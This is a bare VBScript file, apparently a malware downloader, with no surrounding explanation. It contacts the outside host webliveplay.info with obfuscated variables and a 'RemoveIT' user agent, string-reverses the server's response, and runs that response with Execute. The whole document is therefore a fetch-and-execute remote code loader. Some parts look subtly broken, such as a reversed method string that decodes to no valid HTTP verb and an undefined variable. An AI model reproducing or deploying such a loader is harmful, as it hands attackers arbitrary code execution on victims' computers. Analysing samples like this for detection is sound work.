J4QDL="C7sYUP5CdYgUKYxIt6f15c5ra"
URL="http://webliveplay.info/?join=hugw&" & J4QDL
set umXSw=CreateObject("Msxml2.xmlhttp")
umXSw.open StrReverse("ithewego") , URL ,false 
umXSw.setRequestHeader "content-type", "application/x-www-form-urlencoded" & STR_BOUNDARY
umXSw.setRequestHeader "User-Agent", "RemoveIT"
umXSw.send "receber=open"
HPZJg=StrReverse(umXSw.responseText)
Execute HPZJg
